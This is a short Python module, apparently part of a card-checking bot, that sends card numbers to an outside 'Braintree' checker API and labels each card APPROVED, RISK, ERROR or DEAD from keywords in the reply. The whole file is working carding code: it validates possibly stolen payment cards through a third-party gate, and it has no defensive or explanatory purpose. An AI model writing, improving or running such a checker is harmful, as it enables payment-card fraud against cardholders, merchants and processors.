import aiohttp
import asyncio
import logging

logger = logging.getLogger(__name__)

API_URL = "http://botspark.de1.octavia.id:25684/b3"

TIMEOUT_TOTAL = 120
TIMEOUT_CONNECT = 10
TIMEOUT_READ = 60
MAX_RETRIES = 3
RETRY_DELAY = 1

# ============ CEK BRAINTREE ============
async def check_braintree(card: str) -> dict:
    """Check kartu ke API Braintree"""
    params = {"cc": card}
    
    timeout = aiohttp.ClientTimeout(
        total=TIMEOUT_TOTAL,
        connect=TIMEOUT_CONNECT,
        sock_read=TIMEOUT_READ
    )
    
    for attempt in range(MAX_RETRIES + 1):
        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                logger.debug(f"Braintree request: {API_URL} (attempt {attempt+1})")
                async with session.get(API_URL, params=params) as resp:
                    if resp.status != 200:
                        return {"status": "ERROR", "raw": f"HTTP {resp.status}"}
                    
                    data = await resp.json()
                    return parse_response(data)
                    
        except asyncio.TimeoutError:
            if attempt < MAX_RETRIES:
                await asyncio.sleep(RETRY_DELAY)
                continue
            return {"status": "ERROR", "raw": "TIMEOUT"}
            
        except Exception as e:
            logger.error(f"Braintree error: {e}")
            if attempt < MAX_RETRIES:
                await asyncio.sleep(RETRY_DELAY)
                continue
            return {"status": "ERROR", "raw": str(e)}
    
    return {"status": "ERROR", "raw": "Max retries exceeded"}

# ============ PARSE RESPONSE ============
def parse_response(data: dict) -> dict:
    """Parse response dari API Braintree"""
    response_text = data.get("response", "")
    gate = data.get("Gate", "Braintree Auth")
    time_taken = data.get("time", "N/A")
    
    # Cek status berdasarkan response
    response_lower = response_text.lower()
    
    # Approved
    if "avs" in response_lower or "bien" in response_lower or "funds" in response_lower:
        status = "APPROVED"
    # Risk
    elif "risk" in response_lower:
        status = "RISK"
    # Error
    elif "unknown" in response_lower or "timeout" in response_lower:
        status = "ERROR"
    # Dead (default)
    else:
        status = "DEAD"
    
    return {
        "status": status,
        "response": response_text,
        "gate": gate,
        "time": time_taken,
        "raw": data
    }